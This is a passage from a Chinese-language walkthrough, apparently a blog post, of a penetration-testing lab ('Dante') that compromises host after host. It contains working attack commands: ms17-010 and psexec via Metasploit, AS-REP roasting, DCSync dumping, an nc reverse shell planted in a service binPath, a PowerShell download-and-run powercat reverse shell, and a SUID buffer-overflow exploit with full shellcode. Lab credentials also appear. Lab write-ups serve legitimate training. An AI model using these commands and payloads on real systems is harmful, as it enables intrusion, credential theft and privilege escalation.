+<p><img src="https://pic.imgdb.cn/item/64622bf80d2dde577750042c.jpg"></p>
+<p>此时已经上传好了webshell了，只不过webshell的格式蚁剑连不上，依然把上面免杀之后的马上传，然后蚁剑连接即可：</p>
+<p><img src="https://pic.imgdb.cn/item/64622d1b0d2dde577751800b.jpg"></p>
+<p><img src="https://pic.imgdb.cn/item/64622d320d2dde577751aad9.jpg"></p>
+<p>flag在blake桌面目录下的flag.txt中</p>
+<h3 id="MinatoTW-strikes-again"><a href="#MinatoTW-strikes-again" class="headerlink" title="MinatoTW strikes again"></a>MinatoTW strikes again</h3><p>接着上传一个利用msfvenom生成的马，然后执行得到一个meterpreter，得到meterpreter之后直接getsystem拿到system权限：</p>
+<p><img src="https://pic.imgdb.cn/item/64622e460d2dde577752f4d7.jpg"></p>
+<p>至此DANTE-WS03也打完了。</p>
+<h3 id="That-just-blew-my-mind"><a href="#That-just-blew-my-mind" class="headerlink" title="That just blew my mind"></a>That just blew my mind</h3><p>接下来看172.16.1.20，fscan扫描结果显示开放了22、80、135、139、443、445以及88端口。既然开放了88端口，那有可能是一台域控。fscan还显示存在ms17-010漏洞，那么用直接msf打就可以了：</p>
+<p><img src="https://pic.imgdb.cn/item/6461e3130d2dde5777d3369d.jpg"></p>
+<p>拿到meterpreter之后，直接就是system权限。之后我们会在katwamba的桌面目录下看到一个叫职工备份的xlsx文件：</p>
+<p><img src="https://pic.imgdb.cn/item/64623af10d2dde577764df8d.jpg"></p>
+<p>我们把它下载下来：</p>
+<p><img src="https://pic.imgdb.cn/item/64623b4c0d2dde577765afd0.jpg"></p>
+<p>观察这里，B列被隐藏了：</p>
+<p><img src="https://pic.imgdb.cn/item/64623be40d2dde577766f146.jpg"></p>
+<p>我们将它还原出后，可以得到A列username，B列password。对了，执行<code>net user mrb3n</code>有惊喜哦。之后我们通过调用msf的kiwi模块可以抓取到一对帐号密码，<code>xadmin:Peacemaker!</code>，还是一个域管。不过令人悲伤的是，dante.local这个域中似乎只有DANTE-DC01这一台机子了，以下是通过ldapsearch搜索得到的结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># proxychains4 ldapsearch -x -H ldap://172.16.1.20:389 -D &quot;CN=xadmin,CN=Users,DC=DANTE,DC=local&quot; -w Peacemaker! -b &quot;DC=DANTE,DC=local&quot; &quot;(&amp;(objectCategory=computer)(objectClass=computer))&quot; CN | grep cn  </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.20:389  ...  OK</span><br><span class="line">cn: DANTE-DC01</span><br></pre></td></tr></table></figure>
+
+<p>因此拿到域管账户似乎也无济于事。</p>
+<h3 id="Update-the-policy"><a href="#Update-the-policy" class="headerlink" title="Update the policy!"></a>Update the policy!</h3><p>那接着我们看172.16.1.101这台机子，nmap扫描之后开放的端口有21、135、139、445、5040、5985。之后尝试ftp匿名登录，无果。尝试利用之前excel中拿到的username和password爆破：</p>
+<p><img src="https://pic.imgdb.cn/item/646252f30d2dde57779d66b2.jpg"></p>
+<p>得到一组可以成功登录ftp的帐号密码：<code>dharding:WestminsterOrange5</code>，ftp登录后，得到一个叫”Remote login.txt“的文件，文件内容如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Dido,</span><br><span class="line">I&#x27;ve had to change your account password due to some security issues we have recently become aware of</span><br><span class="line"></span><br><span class="line">It&#x27;s similar to your FTP password, but with a different number (ie. not 5!)</span><br><span class="line"></span><br><span class="line">Come and see me in person to retrieve your password.</span><br><span class="line"></span><br><span class="line">thanks,</span><br><span class="line">James</span><br></pre></td></tr></table></figure>
+
+<p>提示dharding的账户密码与FTP密码类似，只是最后一位数字5发生了改变，那我们先用for循环生成一个密码字典：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;0..100&#125;;do echo &quot;WestminsterOrange$i&quot; &gt;&gt; pass1.txt;done</span><br></pre></td></tr></table></figure>
+
+<p>之后用cme开始爆破，成功得到账户密码为<code>dharding:WestminsterOrange17</code>：</p>
+<p><img src="https://pic.imgdb.cn/item/646252b80d2dde57779c9e54.jpg"></p>
+<p>用evil-winrm登录即可在桌面拿到flag：</p>
+<p><img src="https://pic.imgdb.cn/item/646253470d2dde57779e74e7.jpg"></p>
+<h3 id="Single-or-double-quotes"><a href="#Single-or-double-quotes" class="headerlink" title="Single or double quotes"></a>Single or double quotes</h3><p>之后我们可以在“C:\Program Files (x86)\IObit”目录下看到“IObit Uninstaller”，查看IObit Uninstaller目录下的History.txt：</p>
+<p><img src="https://pic.imgdb.cn/item/6462595b0d2dde5777ad58f2.jpg"></p>
+<p>该版本的IObit Uninstaller存在通过可信任服务路径提权的问题。但是此处我们却不是通过这个问题来提权的，我们执行一下<code>cmd.exe /c &quot;sc qc IObitUnSvr&quot;</code>，结果如下：</p>
+<p><img src="https://pic.imgdb.cn/item/646259c00d2dde5777ae4234.jpg"></p>
+<p>可以看到IObitUnSvr服务的二进制路径中已经不存在空格了。但是这个服务是以system权限启动的，所以我们可能仍然需要通过这个服务来提权，只是需要另寻它法。因为这台机子powershell的执行策略，我们不能直接使用Get-ServiceAcl.ps1获取服务的ACL，执行<code>Get-ExecutionPolicy</code>可以看到执行策略显示Restricted：</p>
+<p><img src="https://pic.imgdb.cn/item/646257b60d2dde5777a956e2.jpg"></p>
+<p>直接执行Set-ExecutionPolicy Unrestricted又会提示我们拒绝更改。可以利用以下语句查看：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-ExecutionPolicy</span> Bypass <span class="literal">-Command</span> <span class="string">&quot;&amp; &#123;Import-Module C:\Users\dharding\Documents\Get-ServiceAcl.ps1;&#x27;IObitUnSvr&#x27; | Get-ServiceAcl | select -ExpandProperty Access&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>结果为：</p>
+<p><img src="https://pic.imgdb.cn/item/6462584e0d2dde5777aaea36.jpg"></p>
+<p>可以看到dharding用户拥有查询、更改“IObitUnSvr”服务配置的权限，还拥有开始和关闭该服务的权限。那这直接改IObitUnSvr服务的二进制路径不就直接getsystem了吗？接下来我们上传一个nc程序，之后利用以下语句更改服务的二进制程序路径：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe config IObitUnSvr binPath=<span class="string">&quot;cmd.exe /c C:\Users\dharding\Desktop\nc64.exe -e cmd.exe 10.10.14.2 1238&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行之后再次查看服务配置，可以看到二进制程序路径已经发生了改变：</p>
+<p><img src="https://pic.imgdb.cn/item/64625c2f0d2dde5777b3a3c9.jpg"></p>
+<p>之后sc stop IObitUnSvr再sc start IObitUnSvr重启服务，即可拿到system shell：</p>
+<p><img src="https://pic.imgdb.cn/item/64625c600d2dde5777b40ebb.jpg"></p>
+<h3 id="An-open-goal"><a href="#An-open-goal" class="headerlink" title="An open goal"></a>An open goal</h3><p>接着我们看172.16.1.5这台机子，fscan扫描结果显示开放了21、135、139、445以及1433端口，1433端口一般被mssql占用。 首先ftp匿名登录，拿到第一个flag：</p>
+<p><img src="https://pic.imgdb.cn/item/64625e1c0d2dde5777b7e878.jpg"></p>
+<p>因为没有帐号和密码，我们无法连接smb和mssql，因此这台机子先暂时搁置。打后面的机子再看看有没有线索。</p>
+<h3 id="It’s-getting-hot-in-here"><a href="#It’s-getting-hot-in-here" class="headerlink" title="It’s getting hot in here"></a>It’s getting hot in here</h3><p>因为之前的Dante-DC01通过ms17-010打经常session维持不起来，没一会儿就掉了，所以我这里是利用之前得到的域管帐号通过evil-winrm登录进去，并上传msf马，运行木马拿到的meterpreter。，执行ipconfig之后看到有三张网卡：</p>
+<p><img src="https://pic.imgdb.cn/item/646261570d2dde5777c1248d.jpg"></p>
+<p>猜测可能还存在一个网段，利用以下cmd命令扫一下172.16.2.0&#x2F;24这个段吧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find &quot;Reply&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/6462623a0d2dde5777c2f8b7.jpg"></p>
+<p>发现还有一台IP为172.16.2.5的主机。之后添加路由，把172.16.2.0&#x2F;24这个段给添加进来（run autoroute -s 172.16.2.0&#x2F;24），扫一波端口：</p>
+<p><img src="https://pic.imgdb.cn/item/646264930d2dde5777c7aaf6.jpg"></p>
+<p>这台主机运行着DNS、Kerberos还有LDAP，应该又是一台DC。建立一条代理：</p>
+<p><img src="https://pic.imgdb.cn/item/646266d50d2dde5777cc4c77.jpg"></p>
+<p>之后我们会通过这条代理打172.16.2.5。故技重施利用ms17-010打172.16.2.5，没成功：</p>
+<p><img src="https://pic.imgdb.cn/item/6462676d0d2dde5777cd60cb.jpg"></p>
+<p>那接下来就对域内用户进行枚举吧。了解Kerberos协议的师傅应该知道域内用户枚举的原理，大致就是因为AS_REQ发送的请求包中cname字段的正确与否，导致AS_REP响应包的不同来进行枚举的。首先我们进行端口转发，把88端口和53端口转发到本地：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -L 127.0.0.1 -l 53 -p 53 -r 172.16.2.5</span><br><span class="line">portfwd add -L 127.0.0.1 -l 88 -p 88 -r 172.16.2.5</span><br></pre></td></tr></table></figure>
+
+<p>之后使用kerbrute进行域用户名枚举，用户名字典是之前从excel文件中读到那些username：</p>
+<p><img src="https://pic.imgdb.cn/item/64626de60d2dde5777d89f05.jpg"></p>
+<p>之后利用cme爆破密码，跑了一夜，睡觉去了，醒来发现没结果，我知道是时候放弃直接爆破密码了。此时我们手上已经有了一个域用户的username，但没有该用户的密码，因此无法进行Kerberoasting攻击，但是可以进行AS_REP Roasting攻击。AS_REP Roasting攻击是因为域用户勾选了”不要求Kerberos预身份验证“的选项，攻击者进行AS_REQ之后，KDC会不作任何验证便将 TGT 票据和加密的 Session-key 等信息返回，即AS_REP。攻击者可以对由用户的NTLM Hash加密之后的Session-key 进行离线破解，如果爆破成功，就能得到该指定用户的明文密码。 impacket的GetNPUsers.py脚本为我们提供了进行AS_REP Roasting攻击的工具：</p>
+<p><img src="https://pic.imgdb.cn/item/646273290d2dde5777e05761.jpg"></p>
+<p>之后我们利用john对该Hash进行爆破：</p>
+<p><img src="https://pic.imgdb.cn/item/646274830d2dde5777e2716c.jpg"></p>
+<p>之后利用evil-winrm登录就行了，Desktop目录下拿到flag：</p>
+<p><img src="https://pic.imgdb.cn/item/646274fe0d2dde5777e30ea3.jpg"></p>
+<h3 id="One-misconfig-to-rule-them-all"><a href="#One-misconfig-to-rule-them-all" class="headerlink" title="One misconfig to rule them all"></a>One misconfig to rule them all</h3><p>之后我们上传SharpHound.exe采集数据，导入进BloodHound，点击分析里的<code>Find Principalswith DCSync Rights</code>选项卡，可以发现jbercov可以对dante.admin域进行DCSync攻击。利用impacket的secretsdump.py脚本进行攻击：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q python3 secretsdump.py dante/jbercov:myspace7@172.16.2.5 -just-dc-user Administrator</span><br></pre></td></tr></table></figure>
+
+<p>抓到了Administrator的密码Hash：</p>
+<p><img src="https://pic.imgdb.cn/item/64627ad50d2dde5777e91601.jpg"></p>
+<p>之后我们可以通过PTH的方法配合使用psexec工具来拿到system权限：</p>
+<p><img src="https://pic.imgdb.cn/item/64627c730d2dde5777ebf3f8.jpg"></p>
+<p>也可以通过msf的psexec模块来返回一个meterpreter：</p>
+<p><img src="https://pic.imgdb.cn/item/64627dff0d2dde5777ed71af.jpg"></p>
+<p>之后我们上传chisel，创建一条代理：</p>
+<p><img src="https://pic.imgdb.cn/item/64627e260d2dde5777ed8a8f.jpg"></p>
+<p>在C:\Users\Administrator\Documents目录处存在一个Jenkins.bat文件，内容为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user Admin_129834765 SamsungOctober102030 /add</span><br></pre></td></tr></table></figure>
+
+<h3 id="We’re-going-in-circles"><a href="#We’re-going-in-circles" class="headerlink" title="We’re going in circles"></a>We’re going in circles</h3><p>在172.16.1.19的8080端口上运行着Jenkins服务，利用密码可以成功登录：</p>
+<p><img src="https://pic.imgdb.cn/item/6462803c0d2dde5777eecc0b.jpg"></p>
+<p>接着我们进入&#x2F;script目录，利用以下语句进行命令执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println &quot;ls -al&quot;.execute().text</span><br></pre></td></tr></table></figure>
+
+<p>之后拿到meterpreter，此时用户为jenkins:</p>
+<p><img src="https://pic.imgdb.cn/item/6462819a0d2dde5777eff151.jpg"></p>
+<p>之后上传pspy发现以下进程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023/05/13 10:23:01 CMD: UID=0    PID=12129  | /bin/sh -c /bin/bash mysql -u ian -p VPN123ZXC</span><br></pre></td></tr></table></figure>
+
+<p>得到一组帐号密码：<code>ian:VPN123ZXC</code>，直接su切换至ian用户，发现在disk组里：</p>
+<p><img src="https://pic.imgdb.cn/item/646282340d2dde5777f098c5.jpg"></p>
+<p>hacktricks里对disk组提权的方法进行了介绍：<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group</a> 首先我们看看&#x2F;dev设备里有哪些所属组是disk：</p>
+<p><img src="https://pic.imgdb.cn/item/6462831f0d2dde5777f12980.jpg"></p>
+<p>之后执行<code>df -h</code>看看根目录被挂载到了哪里：</p>
+<p><img src="https://pic.imgdb.cn/item/6462835e0d2dde5777f14d65.jpg"></p>
+<p>根目录被挂在到了&#x2F;dev&#x2F;sda5，之后就与hacktricks中介绍的方法类似了：</p>
+<p><img src="https://pic.imgdb.cn/item/6462b1330d2dde577712466e.jpg"></p>
+<h3 id="My-cup-runneth-over"><a href="#My-cup-runneth-over" class="headerlink" title="My cup runneth over"></a>My cup runneth over</h3><p>接下来我们在DC02中执行如下cmd命令来探测172.16.2.0&#x2F;24网段的存活主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find &quot;Reply&quot;</span><br></pre></td></tr></table></figure>
+
+<p>结果为：</p>
+<p><img src="https://pic.imgdb.cn/item/646285760d2dde5777f2881f.jpg"></p>
+<p>该网段还存在一个IP为172.16.2.101的主机，使用auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp模块探测一下开放的端口，发现开放了22端口。我们将22端口转发到本地：</p>
+<p><img src="https://pic.imgdb.cn/item/64628cbd0d2dde5777f8b156.jpg"></p>
+<p>尝试爆破一下ssh帐号和密码，用户名字典和密码字典都是从之前的excel文件中得到的。还记得我们之前爆破得出的<code>julian:manchesterunited</code>这对帐号密码吗？我们将它一起添加进字典中，使用hydra爆破，结果正是之前得到的julian：</p>
+<p><img src="https://pic.imgdb.cn/item/64628c9b0d2dde5777f89d31.jpg"></p>
+<p>接着用ssh登录后，尝试SUID提权：</p>
+<p><img src="https://pic.imgdb.cn/item/64628ed70d2dde5777f9941c.jpg"></p>
+<p>发现&#x2F;usr&#x2F;sbin&#x2F;readfile被设置了SUID位，复制到本地，利用<a target="_blank" rel="noopener" href="https://dogbolt.org/">https://dogbolt.org/</a> 在线反编译站点对这个二进制文件进行反编译，观察Ghidra模块，其中主函数如下所示：</p>
+<p><img src="https://pic.imgdb.cn/item/64628fa00d2dde5777fa2cf1.jpg"></p>
+<p>首先判断我们是否传入了参数，如果没有则输出<code>&quot;Syntax: %s &lt;/path/to/file&gt;\n</code>。否则，就将真实、有效且已保存的用户或组ID设置为root。接下来还调用了strcpy()函数，将用户输入param2复制到local_58缓冲区。local_58缓冲区长度为80,如果超过80,则会导致缓冲区溢出，并且可以用来获得主机上的root访问权限。 接下来我们执行gdb readfile，gdb还安装了peda插件，执行checksec检查二进制的各种安全选项：</p>
+<p><img src="https://pic.imgdb.cn/item/646291440d2dde5777fb2fe8.jpg"></p>
+<p>之后，我们检查ASLR：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/646291d70d2dde5777fb773e.jpg"></p>
+<p>可以看到，ASLR被关闭。使用gdb，我们生成一个100字节的模式，并使用r参数运行程序：</p>
+<p><img src="https://pic.imgdb.cn/item/646292c90d2dde5777fbe1e7.jpg"></p>
+<p>可以看到RSP指向我们有效载荷的一部分（AAKAAgAA6AAL）。我们搜索这个偏移量在哪里</p>
+<p><img src="https://pic.imgdb.cn/item/6462933e0d2dde5777fc0edf.jpg"></p>
+<p>偏移量是88，因此我们用python生成88个’A’和8个’B’：</p>
+<p><img src="https://pic.imgdb.cn/item/646293b40d2dde5777fc42c9.jpg"></p>
+<p>可以看到RSP被8个’B’给填满。我们可以把B替换为我们shellcode的地址。64位的shellcode可以从<a target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/files/shellcode-806.html">这里</a>调用&#x2F;bin&#x2F;sh，其中”\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05”一共是27个byte，接着我们执行下面的代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r $(python2 -c &#x27;print &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot; + &quot;A&quot;*(88-27) + &quot;B&quot;*6&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/646295d90d2dde5777fd1790.jpg"></p>
+<p>我们将使用以下命令分析堆栈的前120个字节：</p>
+<p><img src="https://pic.imgdb.cn/item/646296620d2dde5777fd792c.jpg"></p>
+<p>没找到shellcode，可以通过删除200个字节来分析RSP之前的内存内容：</p>
+<p><img src="https://pic.imgdb.cn/item/646297210d2dde5777fe402c.jpg"></p>
+<p>此时找到了shellcode。shellcode出现在内存表示中的第二个八位字节中。下一个地址是0x7fffffffe378。我们可以通过从下一个字节中删除8个字节来计算shellcode地址，0x7fffffffe370。之后我们用这个地址来代替这些’B’：</p>
+<p><img src="https://pic.imgdb.cn/item/646298550d2dde5777ffdf7c.jpg"></p>
+<p>可以看到已经成功进入shell了，可是执行id之后发现是julian：</p>
+<p><img src="https://pic.imgdb.cn/item/646298ae0d2dde57770088c2.jpg"></p>
+<p>这很正常，因为gdb调试二进制文件的时候不会提升权限。接着我们执行<code>/usr/sbin/readfile $(python2 -c &#39;print &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot; + &quot;A&quot;*(88-27) + &quot;\x70\xe3\xff\xff\xff\x7f&quot;&#39;)</code>，结果为：</p>
+<p><img src="https://pic.imgdb.cn/item/6462998b0d2dde5777016720.jpg"></p>
+<p>这里的原因是gdb在堆栈中保留了一些环境变量，因此我们的shellcode在有gdb和没有gdb的情况下有不同的地址。 我们可以通过将外壳代码存储在env变量中来执行相同的攻击，然后可以指向堆栈到此变量的地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export SHELLCODE=`python2 -c &#x27;print&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;&#x27;`</span><br></pre></td></tr></table></figure>
+
+<p>SHELLCODE变量的地址可以通过以下代码获得：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">    </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  <span class="type">char</span> *ptr;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span>(argc &lt; <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;environment variable&gt; &lt;target program name&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ptr = getenv(argv[<span class="number">1</span>]); <span class="comment">/* get env var location */</span></span><br><span class="line">  ptr += (<span class="built_in">strlen</span>(argv[<span class="number">0</span>]) - <span class="built_in">strlen</span>(argv[<span class="number">2</span>]))*<span class="number">2</span>; <span class="comment">/* adjust for program name */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s will be at %p\n&quot;</span>, argv[<span class="number">1</span>], ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后我们编译上面这段代码并运行生产的二进制文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc getenv.c -o getenv &amp;&amp; <span class="built_in">chmod</span> +x getenv &amp;&amp; ./getenv SHELLCODE /usr/sbin/readfile</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/64629b310d2dde577702312a.jpg"></p>
+<p>最后我们调整调用，这次使用了新地址，成功getroot：</p>
+<p><img src="https://pic.imgdb.cn/item/6462b1730d2dde5777126ddf.jpg"></p>
+<h3 id="What-do-we-have-here"><a href="#What-do-we-have-here" class="headerlink" title="What do we have here?!"></a>What do we have here?!</h3><p>接着我们再在这台机子上通过以下命令来查看存活主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;1..255&#125; ;do (ping -c 1 172.16.2.$i | grep &quot;bytes from&quot;|cut -d &#x27; &#x27; -f4|tr -d &#x27;:&#x27; &amp;);done</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/64629c580d2dde577702b8d4.jpg"></p>
+<p>找到了一台新机子，IP为172.16.2.6。通过扫描端口，发现开启了22端口和631端口，我们再次使用julian的帐号连上去，可以直接拿到flag：</p>
+<p><img src="https://pic.imgdb.cn/item/6462b1930d2dde57771285b7.jpg"></p>
+<p>接着我们在Desktop目录下找到一个SQL文件，文件内容为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">julian@DANTE-ADMIN-NIX06:~/Desktop$ cat SQL</span><br><span class="line">Hi Julian</span><br><span class="line">I&#x27;ve put this on your personal desktop as its probably the most secure </span><br><span class="line">place on the network!</span><br><span class="line"></span><br><span class="line">Can you please ask Sophie to change her SQL password when she logs in</span><br><span class="line">again? I&#x27;ve reset it to TerrorInflictPurpleDirt996655 as it stands, but</span><br><span class="line">obviously this is a tough one to remember</span><br><span class="line"></span><br><span class="line">Maybe we should all get password managers?</span><br><span class="line"></span><br><span class="line">Thanks,</span><br><span class="line">James</span><br></pre></td></tr></table></figure>
+
+<p>得到一组帐号密码<code>sophie:TerrorInflictPurpleDirt996655</code>。</p>
+<h3 id="It-doesn’t-get-any-easier-than-this"><a href="#It-doesn’t-get-any-easier-than-this" class="headerlink" title="It doesn’t get any easier than this"></a>It doesn’t get any easier than this</h3><p>之后还可以在home目录下找到一个名为plongbottom的用户，而这个用户也正好在我们之前得到的那个excel文件里。因此我们直接su切换至该用户。之后执行sudo -l后，发现可以sudo执行任何命令，那直接sudo去看root目录下的flag即可：</p>
+<p><img src="https://pic.imgdb.cn/item/64629de90d2dde577703bf5e.jpg"></p>
+<h3 id="Fail-2-The-Sequel"><a href="#Fail-2-The-Sequel" class="headerlink" title="Fail 2: The Sequel"></a>Fail 2: The Sequel</h3><p>接下来，我们回过头来看172.16.1.5这台机子，之前因为没有线索而将它暂时搁置了。现在我们拿到了sophie的帐号密码，可以尝试登录一下了。利用impacket中的mssqlclient可以进行登录：</p>
+<p><img src="https://pic.imgdb.cn/item/64629e810d2dde5777041141.jpg"></p>
+<p>接着开始提权，首先执行<code>select is_srvrolemember(&#39;sysadmin&#39;);</code>判断当前是否为DBA权限，为1则可以提权：</p>
+<p><img src="https://pic.imgdb.cn/item/64629edc0d2dde57770439c4.jpg"></p>
+<p>接着我们 查看能否使用 xp_cmdshell，从MSSQL2005版本之后默认关闭： <code>select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name = &#39;xp_cmdshell&#39;</code></p>
+<p><img src="https://pic.imgdb.cn/item/64629f180d2dde5777045812.jpg"></p>
+<p>可以使用xp_cmdshell，我这里使用powercat来反弹shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell IEX (New-Object Net.WebClient).DownloadString(\&quot;http://10.10.14.2:1241/powercat.ps1\&quot;);powercat -c 10.10.14.2 -p 1242 -e cmd&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/6462a06c0d2dde577704feac.jpg"></p>
+<p>在C:\DB_backups目录下发现一个名叫db_backup.ps1的文件，尝试读取：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">db_backup.ps1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Work in progress database backup script. Adapting from mysql backup script. Does not work yet. Do not use.</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;Alltheleavesarebrown1&#x27;</span></span><br><span class="line"><span class="variable">$user</span> = <span class="string">&#x27;sophie&#x27;</span></span><br><span class="line"><span class="variable">$cred</span> = <span class="built_in">New-Object</span> System.Net.NetworkCredential(<span class="variable">$user</span>, <span class="variable">$password</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$date</span> = <span class="built_in">Get-Date</span></span><br><span class="line"><span class="variable">$dateString</span> = <span class="variable">$date</span>.Year.ToString() + <span class="string">&quot;-&quot;</span> + <span class="variable">$date</span>.Month.ToString() + <span class="string">&quot;-&quot;</span> + <span class="variable">$date</span>.Day.ToString()</span><br><span class="line"></span><br><span class="line"><span class="comment">#Create symbolic link for sqldump.exe in the script folder</span></span><br><span class="line"><span class="variable">$sqldumpLocation</span> = \.sqldump.exe</span><br><span class="line"><span class="variable">$backupDest</span> = C:\DB_backups\SQL\sql_backup_<span class="string">&quot;+ <span class="variable">$dateString</span> + 